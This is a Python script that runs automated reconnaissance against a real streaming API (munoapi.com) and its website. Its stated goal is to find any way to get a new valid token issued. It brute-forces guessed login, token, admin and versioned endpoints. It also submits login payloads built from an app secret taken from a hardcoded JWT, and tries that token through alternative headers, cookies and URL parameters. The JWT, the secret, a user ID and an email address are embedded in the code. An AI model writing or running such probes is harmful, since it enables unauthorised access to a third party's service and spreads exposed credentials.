#!/usr/bin/env python3
"""
Munowatch API Full Reconnaissance — Phase 1
============================================
Systematically probes the API for:
  • Hidden auth endpoints (login, register, token, refresh, key, etc.)
  • Alternative API versions (v1, v2, v3, v4, etc.)
  • Different URL patterns and path variations
  • CORS and OPTIONS responses that reveal server structure
  • Server error messages that leak endpoint info
  • Header-based auth alternatives

Goal: Find ANY way to get a new valid token issued.
"""

import time
import json
import sys
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "https://munoapi.com"
API_BASE = f"{BASE_URL}/api"
USER_ID = "82717"
USER_AGENT = "Android IOS v3.0"

ORIGINAL_TOKEN = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    "eyJ1c2VybmFtZSI6IkFuZHJvaWQgVFYiLCJhcHBuYW1lIjoiTXVub3dhdGNoIFRWIiwiaG9zdCI6"
    "Im11bm93YXRjaC5jbyIsImFwcHNlY3JldCI6IjAyMjc3OGU0MThhZDY4ZmZkYTlhYTRmYWIxODky"
    "ZmZmIiwiYWN0aXZhdGVkIjoiMSIsImV4cCI6MTcwNzM2ODQwMH0.unlPnEzptg6VFHs7WWm213bR"
    "HHNxYuAN2eZQvjtPKL0"
)

PASS = "\033[92m"; FAIL = "\033[91m"; WARN = "\033[93m"
BOLD = "\033[1m"; DIM = "\033[90m"; CYAN = "\033[96m"; RESET = "\033[0m"
RED_BG = "\033[41m"; GREEN_BG = "\033[42m"

def make_headers(token=None, extra=None):
    h = {"Accept": "application/json", "User-Agent": USER_AGENT}
    if token:
        h["X-Api-Key"] = token
        h["Authorization"] = f"Bearer {token}"
    if extra:
        h.update(extra)
    return h

def probe(endpoint, method="GET", token=None, data=None, timeout=8, label=""):
    """Probe a single endpoint and return structured result."""
    url = f"{API_BASE}/{endpoint}" if not endpoint.startswith("http") else endpoint
    headers = make_headers(token)
    
    try:
        if method == "GET":
            r = requests.get(url, headers=headers, timeout=timeout, allow_redirects=False)
        elif method == "POST":
            r = requests.post(url, headers=headers, json=data, timeout=timeout, allow_redirects=False)
        elif method == "OPTIONS":
            r = requests.options(url, headers=headers, timeout=timeout, allow_redirects=False)
        elif method == "HEAD":
            r = requests.head(url, headers=headers, timeout=timeout, allow_redirects=False)
        
        ct = r.headers.get("content-type", "")
        is_json = "json" in ct
        is_html = "html" in ct
        
        body = None
        snippet = ""
        if is_json:
            try:
                body = r.json()
            except:
                snippet = r.text[:200]
        else:
            snippet = r.text[:200]
        
        return {
            "url": url,
            "status": r.status_code,
            "is_json": is_json,
            "is_html": is_html,
            "body": body,
            "snippet": snippet,
            "label": label,
            "headers": dict(r.headers),
            "method": method,
        }
    except requests.exceptions.Timeout:
        return {"status": 0, "error": "TIMEOUT", "label": label}
    except requests.exceptions.ConnectionError:
        return {"status": 0, "error": "CONN_ERR", "label": label}
    except Exception as e:
        return {"status": 0, "error": str(e)[:50], "label": label}

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 1A: AUTH ENDPOINT DISCOVERY
# ══════════════════════════════════════════════════════════════════════════════

print(f"\n{BOLD}{CYAN}{'='*80}{RESET}")
print(f"{BOLD}{CYAN}  PHASE 1A: AUTH ENDPOINT DISCOVERY{RESET}")
print(f"{BOLD}{CYAN}{'='*80}{RESET}")

auth_endpoints = [
    # Login variants
    ("login", "POST", None, "login"),
    ("auth/login", "POST", None, "auth/login"),
    ("user/login", "POST", None, "user/login"),
    ("api/login", "POST", None, "api/login"),
    ("auth/signin", "POST", None, "auth/signin"),
    ("user/signin", "POST", None, "user/signin"),
    ("signin", "POST", None, "signin"),
    
    # Register variants
    ("register", "POST", None, "register"),
    ("auth/register", "POST", None, "auth/register"),
    ("user/register", "POST", None, "user/register"),
    ("signup", "POST", None, "signup"),
    ("auth/signup", "POST", None, "auth/signup"),
    
    # Token variants
    ("token", "POST", None, "token"),
    ("auth/token", "POST", None, "auth/token"),
    ("api/token", "POST", None, "api/token"),
    ("token/generate", "POST", None, "token/generate"),
    ("token/create", "POST", None, "token/create"),
    ("token/new", "POST", None, "token/new"),
    ("token/refresh", "POST", None, "token/refresh"),
    ("token/renew", "POST", None, "token/renew"),
    ("token/issue", "POST", None, "token/issue"),
    ("auth/refresh", "POST", None, "auth/refresh"),
    ("auth/renew", "POST", None, "auth/renew"),
    ("refresh/token", "POST", None, "refresh/token"),
    ("apikey", "POST", None, "apikey"),
    ("api/key", "POST", None, "api/key"),
    ("api/generate", "POST", None, "api/generate"),
    ("key/generate", "POST", None, "key/generate"),
    ("generate/key", "POST", None, "generate/key"),
    ("get/token", "POST", None, "get/token"),
    ("get/apikey", "POST", None, "get/apikey"),
    
    # Key/app registration
    ("app/register", "POST", None, "app/register"),
    ("app/create", "POST", None, "app/create"),
    ("developer/register", "POST", None, "developer/register"),
    ("developer/key", "POST", None, "developer/key"),
    
    # User/auth with credentials
    ("auth", "POST", None, "auth"),
    ("authenticate", "POST", None, "authenticate"),
    ("verify", "POST", None, "verify"),
    ("auth/verify", "POST", None, "auth/verify"),
    
    # Password reset
    ("forgot", "POST", None, "forgot"),
    ("reset", "POST", None, "reset"),
    ("auth/reset", "POST", None, "auth/reset"),
    ("password/reset", "POST", None, "password/reset"),
    
    # Logout
    ("logout", "POST", None, "logout"),
    ("auth/logout", "POST", None, "auth/logout"),
    
    # App-specific (based on JWT payload claims)
    ("app/activate", "POST", None, "app/activate"),
    ("activate", "POST", None, "activate"),
    ("app/auth", "POST", None, "app/auth"),
    
    # GET variants (some APIs use GET for token)
    ("token", "GET", None, "token GET"),
    ("auth/token", "GET", None, "auth/token GET"),
    ("api/status", "GET", None, "api/status"),
    ("status", "GET", None, "status"),
    ("health", "GET", None, "health"),
    ("ping", "GET", None, "ping"),
    ("info", "GET", None, "info"),
    ("api/info", "GET", None, "api/info"),
    
    # Common framework endpoints
    ("", "GET", None, "root"),
    ("api", "GET", None, "api root"),
    ("docs", "GET", None, "docs"),
    ("swagger", "GET", None, "swagger"),
    ("openapi", "GET", None, "openapi"),
    ("graphql", "POST", None, "graphql"),
    
    # Version-specific auth
    ("v1/auth", "POST", None, "v1/auth"),
    ("v2/auth", "POST", None, "v2/auth"),
    ("v3/auth", "POST", None, "v3/auth"),
    ("v1/token", "POST", None, "v1/token"),
    ("v2/token", "POST", None, "v2/token"),
    ("v3/token", "POST", None, "v3/token"),
    
    # Munowatch-specific guesses
    ("munowatch/auth", "POST", None, "munowatch/auth"),
    ("muno/auth", "POST", None, "muno/auth"),
    ("tv/auth", "POST", None, "tv/auth"),
    ("android/auth", "POST", None, "android/auth"),
    ("tv/token", "POST", None, "tv/token"),
    ("tv/login", "POST", None, "tv/login"),
    ("device/register", "POST", None, "device/register"),
    ("device/auth", "POST", None, "device/auth"),
]

# Login data payloads to try
login_payloads = [
    {"username": "Android TV", "password": "022778e418ad68ffda9aa4fab1892fff"},
    {"appname": "Munowatch TV", "appsecret": "022778e418ad68ffda9aa4fab1892fff"},
    {"username": "82717", "password": "022778e418ad68ffda9aa4fab1892fff"},
    {"user_id": "82717", "appsecret": "022778e418ad68ffda9aa4fab1892fff"},
    {"host": "munowatch.co", "appsecret": "022778e418ad68ffda9aa4fab1892fff"},
    {"email": "hamcodz@munowatch.co", "password": "022778e418ad68ffda9aa4fab1892fff"},
]

interesting = []
tested = 0
total = len(auth_endpoints) + (len(auth_endpoints) * len(login_payloads))  # rough estimate

print(f"\n  Probing {len(auth_endpoints)} endpoint paths with GET/POST...")
print(f"  Then testing login POST payloads on auth endpoints...\n")

# First pass: probe all endpoints without auth data (quick scan)
for ep, method, _, label in auth_endpoints:
    result = probe(ep, method=method, timeout=6, label=label)
    tested += 1
    status = result.get("status", 0)
    body = result.get("body")
    snippet = result.get("snippet", "")
    
    # Flag interesting responses
    is_interesting = False
    detail = ""
    
    if status == 200:
        if body and isinstance(body, dict):
            # Check if it returned a token
            if "token" in str(body).lower() or "api_key" in str(body).lower() or "jwt" in str(body).lower():
                is_interesting = True
                detail = f"CONTAINS TOKEN/KEY!"
            elif any(k in body for k in ("dashboard", "banner", "data", "user")):
                is_interesting = True
                detail = f"keys: {list(body.keys())[:5]}"
            else:
                detail = f"keys: {list(body.keys())[:5]}"
                is_interesting = True
        elif not body and snippet:
            detail = snippet[:60]
            if "login" in snippet.lower() or "auth" in snippet.lower():
                is_interesting = True
    elif status == 405:
        # Method not allowed — try the other method
        alt_method = "POST" if method == "GET" else "GET"
        alt = probe(ep, method=alt_method, timeout=6, label=f"{label} ({alt_method})")
        if alt.get("status") != 405:
            is_interesting = True
            detail = f"405 but {alt_method} → {alt.get('status')}"
            if alt.get("body") and isinstance(alt["body"], dict):
                detail += f" keys: {list(alt['body'].keys())[:5]}"
    elif status == 404:
        pass  # Boring
    elif status == 0:
        pass  # Connection error, skip
    elif status in (401, 403):
        # These are auth-protected endpoints — interesting!
        is_interesting = True
        detail = "AUTH PROTECTED"
        if body and isinstance(body, dict):
            detail += f": {json.dumps(body)[:80]}"
    elif status >= 500:
        # Server errors can leak info
        if body and isinstance(body, dict):
            exc = body.get("exception", [])
            if isinstance(exc, list) and len(exc) > 0:
                msg = exc[0].get("message", "")
                if msg:
                    is_interesting = True
                    detail = f"LEAK: {msg[:60]}"
    
    if is_interesting:
        interesting.append(result)
        icon = f"{RED_BG} {BOLD}HIT{RESET} " if "TOKEN" in detail else f"{WARN}  *  {RESET} "
        print(f"  {icon}{method:<6} /{ep:<35} → {status}  {detail}")
    
    # Rate limit: small delay
    time.sleep(0.15)

# Second pass: try login payloads on promising endpoints
print(f"\n  {BOLD}Trying login payloads on auth endpoints...{RESET}\n")

login_endpoints = [
    ("login", "POST"), ("auth/login", "POST"), ("user/login", "POST"),
    ("auth", "POST"), ("authenticate", "POST"), ("token", "POST"),
    ("auth/token", "POST"), ("apikey", "POST"), ("api/key", "POST"),
    ("app/auth", "POST"), ("activate", "POST"), ("app/activate", "POST"),
]

for ep, method in login_endpoints:
    for payload in login_payloads:
        result = probe(ep, method=method, data=payload, timeout=6, label=f"{ep} with {list(payload.keys())[0]}")
        status = result.get("status", 0)
        body = result.get("body")
        
        is_interesting = False
        detail = ""
        
        if status == 200 and body and isinstance(body, dict):
            body_str = json.dumps(body).lower()
            if "token" in body_str or "key" in body_str or "jwt" in body_str or "success" in body_str:
                is_interesting = True
                detail = f"RESPONSE: {json.dumps(body)[:120]}"
        elif status == 200 and body and isinstance(body, str):
            if "token" in body.lower() or "eyJ" in body:
                is_interesting = True
                detail = f"RESPONSE: {body[:120]}"
        elif status == 201:
            is_interesting = True
            detail = f"CREATED: {json.dumps(body)[:100] if body else 'no body'}"
        
        if is_interesting:
            interesting.append(result)
            pkey = list(payload.keys())[0]
            print(f"  {RED_BG}{BOLD} HIT{RESET} POST /{ep:<30} ({pkey}={str(payload[pkey])[:20]}...) → {status}")
            print(f"        {detail}")
        
        time.sleep(0.15)

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 1B: PROBE THE WEBSITE FOR API CLUES
# ══════════════════════════════════════════════════════════════════════════════

print(f"\n{BOLD}{CYAN}{'='*80}{RESET}")
print(f"{BOLD}{CYAN}  PHASE 1B: WEBSITE PROBING FOR API CLUES{RESET}")
print(f"{BOLD}{CYAN}{'='*80}{RESET}")

website_probes = [
    ("https://munowatch.co", "munowatch.co main"),
    ("https://munowatch.co/api", "munowatch.co /api"),
    ("https://munowatch.co/login", "munowatch.co login"),
    ("https://munowatch.co/register", "munowatch.co register"),
    ("https://munowatch.co/signin", "munowatch.co signin"),
    ("https://munowatch.co/signup", "munowatch.co signup"),
    ("https://munowatch.co/admin", "munowatch.co admin"),
    ("https://munowatch.co/api/docs", "munowatch.co docs"),
    ("https://munowatch.co/api/v1", "munowatch.co v1"),
    ("https://munowatch.co/developer", "munowatch.co developer"),
    ("https://munowatch.co/app", "munowatch.co app"),
    ("https://munowatch.co/download", "munowatch.co download"),
    ("https://munowatch.co/tv", "munowatch.co tv"),
    ("https://munowatch.co/android", "munowatch.co android"),
    ("https://munowatch.co/.well-known", "munowatch.co well-known"),
    ("https://munowatch.co/robots.txt", "munowatch.co robots"),
    ("https://munowatch.co/sitemap.xml", "munowatch.co sitemap"),
    ("https://munoapi.com", "munoapi.com main"),
    ("https://munoapi.com/api", "munoapi.com /api"),
    ("https://munoapi.com/docs", "munoapi.com docs"),
    ("https://munoapi.com/api/docs", "munoapi.com api/docs"),
    ("https://munoapi.com/api/v1", "munoapi.com v1"),
    ("https://munoapi.com/api/v2", "munoapi.com v2"),
    ("https://munoapi.com/api/v3", "munoapi.com v3"),
    ("https://munoapi.com/api/health", "munoapi.com health"),
    ("https://munoapi.com/api/status", "munoapi.com status"),
    ("https://munoapi.com/api/ping", "munoapi.com ping"),
    ("https://munoapi.com/api/info", "munoapi.com info"),
    ("https://hamcodz.duckdns.org", "hamcodz.duckdns.org"),
]

for url, label in website_probes:
    try:
        r = requests.get(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, 
                        timeout=10, allow_redirects=False)
        
        status = r.status_code
        ct = r.headers.get("content-type", "")
        is_html = "html" in ct
        size = len(r.content)
        
        # Look for API clues in HTML
        api_clues = []
        text = r.text
        
        # Search for API-related strings
        for pattern in ["munoapi", "/api/", "api_key", "apikey", "token", "jwt", 
                        "authorize", "login", "register", "Bearer", "X-Api-Key",
                        "appsecret", "munowatch.co/api"]:
            if pattern.lower() in text.lower():
                # Find context around the match
                idx = text.lower().find(pattern.lower())
                context = text[max(0,idx-30):idx+50].replace('\n', ' ').strip()
                api_clues.append(f"{pattern}: ...{context}...")
        
        # Extract JS file references
        import re
        js_files = re.findall(r'(?:src|href)=["\']([^"\']*\.js[^"\']*)["\']', text)
        
        # Extract form actions
        form_actions = re.findall(r'<form[^>]*action=["\']([^"\']*)["\']', text, re.IGNORECASE)
        
        if status != 404 or api_clues:
            print(f"\n  {BOLD}{label}{RESET} → HTTP {status} ({size} bytes, {'HTML' if is_html else ct})")
            
            if r.status_code in (301, 302, 303, 307, 308):
                loc = r.headers.get("location", "?")
                print(f"    Redirects to: {loc}")
            
            if api_clues:
                print(f"    {GREEN_BG} API CLUES FOUND:{RESET}")
                for clue in api_clues[:5]:
                    print(f"      • {clue[:100]}")
            
            if js_files:
                print(f"    JS files: {js_files[:5]}")
            
            if form_actions:
                print(f"    Forms: {form_actions}")
            
            interesting.append({
                "url": url, "status": status, "label": label,
                "api_clues": api_clues, "js_files": js_files, "form_actions": form_actions,
            })
    except Exception as e:
        pass  # Skip unreachable sites
    
    time.sleep(0.2)

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 1C: VERSION PROBING ON KNOWN ENDPOINTS
# ══════════════════════════════════════════════════════════════════════════════

print(f"\n{BOLD}{CYAN}{'='*80}{RESET}")
print(f"{BOLD}{CYAN}  PHASE 1C: API VERSION & PATH VARIATIONS{RESET}")
print(f"{BOLD}{CYAN}{'='*80}{RESET}")

version_probes = []
for ep in ["dashboard", "dashboard/82717", "search/Avengers/82717/0", "preview/63003/82717"]:
    for prefix in ["", "v1/", "v2/", "v3/", "v4/", "v5/"]:
        for suffix in ["", "/0", "/1"]:
            version_probes.append(f"{prefix}{ep}{suffix}")

for ep in version_probes:
    result = probe(ep, method="GET", token=ORIGINAL_TOKEN, timeout=6, label=ep)
    status = result.get("status", 0)
    body = result.get("body")
    
    if status == 200 and body and isinstance(body, dict):
        has_data = any(k in body for k in ("dashboard", "banner", "search", "results", "preview", "data", "tabs"))
        if has_data:
            print(f"  {PASS}✓{RESET} /{ep:<40} → 200 DATA ({list(body.keys())[:4]})")
            interesting.append(result)
    elif status not in (0, 404, 500):
        if status == 200:
            print(f"  {DIM}  /{ep:<40} → 200 (empty){RESET}")
        else:
            print(f"  {DIM}  /{ep:<40} → {status}{RESET}")
    
    time.sleep(0.1)

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 1D: HEADER-BASED AUTH ALTERNATIVES
# ══════════════════════════════════════════════════════════════════════════════

print(f"\n{BOLD}{CYAN}{'='*80}{RESET}")
print(f"{BOLD}{CYAN}  PHASE 1D: ALTERNATIVE AUTH METHODS{RESET}")
print(f"{BOLD}{CYAN}{'='*80}{RESET}")

# Test different header combinations
header_tests = [
    ("Cookie: token=...", {"Cookie": f"token={ORIGINAL_TOKEN}"}),
    ("Cookie: api_key=...", {"Cookie": f"api_key={ORIGINAL_TOKEN}"}),
    ("Cookie: session=...", {"Cookie": f"session={ORIGINAL_TOKEN}"}),
    ("X-Auth-Token", {"X-Auth-Token": ORIGINAL_TOKEN}),
    ("X-Token", {"X-Token": ORIGINAL_TOKEN}),
    ("X-Access-Token", {"X-Access-Token": ORIGINAL_TOKEN}),
    ("Api-Key (no Bearer)", {"X-Api-Key": ORIGINAL_TOKEN}),  # without Authorization
    ("Authorization only", {"Authorization": f"Bearer {ORIGINAL_TOKEN}"}),
    ("apikey param", None),  # test as URL param
]

for label, extra_hdrs in header_tests:
    url = f"{API_BASE}/search/Avengers/{USER_ID}/0"
    headers = {"Accept": "application/json", "User-Agent": USER_AGENT}
    
    if label == "apikey param":
        url += f"?api_key={ORIGINAL_TOKEN}"
    elif extra_hdrs:
        headers.update(extra_hdrs)
    
    try:
        r = requests.get(url, headers=headers, timeout=8)
        j = r.json() if "json" in r.headers.get("content-type", "") else None
        
        if j and isinstance(j, dict):
            if "401" not in j and "400" not in j:
                print(f"  {GREEN_BG}HIT{RESET} {label:<30} → {r.status_code} keys: {list(j.keys())[:5]}")
                interesting.append({"url": url, "status": r.status_code, "body": j, "label": label})
            elif r.status_code == 200:
                print(f"  {WARN} * {RESET} {label:<30} → 200 (empty response)")
        elif r.status_code == 200:
            print(f"  {WARN} * {RESET} {label:<30} → 200 (non-json)")
    except:
        pass
    
    time.sleep(0.2)

# Test query parameter auth
print(f"\n  {BOLD}Testing URL parameter auth on preview...{RESET}")
param_tests = [
    f"?token={ORIGINAL_TOKEN}",
    f"?api_key={ORIGINAL_TOKEN}",
    f"?key={ORIGINAL_TOKEN}",
    f"?apikey={ORIGINAL_TOKEN}",
    f"?auth={ORIGINAL_TOKEN}",
    f"?secret=022778e418ad68ffda9aa4fab1892fff",
]

for param in param_tests:
    url = f"{API_BASE}/search/Avengers/{USER_ID}/0{param}"
    try:
        r = requests.get(url, headers={"Accept": "application/json", "User-Agent": USER_AGENT}, timeout=8)
        j = r.json() if "json" in r.headers.get("content-type", "") else None
        if j and isinstance(j, dict) and "401" not in j and "400" not in j:
            print(f"  {GREEN_BG}HIT{RESET} {param[:30]:<30} → {r.status_code} keys: {list(j.keys())[:5]}")
            interesting.append({"url": url, "status": r.status_code, "body": j, "label": param})
    except:
        pass
    time.sleep(0.15)

# ══════════════════════════════════════════════════════════════════════════════
# SUMMARY
# ══════════════════════════════════════════════════════════════════════════════

print(f"\n{BOLD}{CYAN}{'='*80}{RESET}")
print(f"{BOLD}{CYAN}  PHASE 1 SUMMARY{RESET}")
print(f"{BOLD}{CYAN}{'='*80}{RESET}")

hits = [r for r in interesting if r.get("status") == 200 and r.get("body") and 
        isinstance(r["body"], dict) and any(k in str(r["body"]).lower() for k in ("token", "key", "jwt", "success", "dashboard", "search", "preview"))]

auth_hits = [r for r in interesting if r.get("api_clues")]
version_hits = [r for r in interesting if r.get("body") and isinstance(r.get("body"), dict) and 
                any(k in r["body"] for k in ("dashboard", "banner", "preview"))]

print(f"\n  Total endpoints probed: ~{tested + len(website_probes) + len(version_probes) + len(header_tests) + len(param_tests)}")
print(f"  Interesting responses: {len(interesting)}")

if auth_hits:
    print(f"\n  {GREEN_BG}AUTH/TOKEN ENDPOINTS FOUND:{RESET}")
    for r in auth_hits:
        for clue in r.get("api_clues", [])[:3]:
            print(f"    • [{r['label']}] {clue[:100]}")

if version_hits:
    print(f"\n  {PASS}WORKING API VERSIONS:{RESET}")
    for r in version_hits:
        ep = r.get("label", r.get("url", "?"))
        keys = list(r["body"].keys())[:4] if isinstance(r.get("body"), dict) else []
        print(f"    • {ep}: {keys}")

print(f"\n  Phase 1 complete. Starting Phase 2...")
print(f"  (Dashboard + Preview deep analysis for full independence)")

# Save results for Phase 2
with open("/home/z/my-project/download/phase1_results.json", "w") as f:
    # Clean results for JSON serialization
    clean = []
    for r in interesting:
        c = {k: v for k, v in r.items() if k != "headers"}
        clean.append(c)
    json.dump(clean, f, indent=2, default=str)

print(f"  Results saved to phase1_results.json")
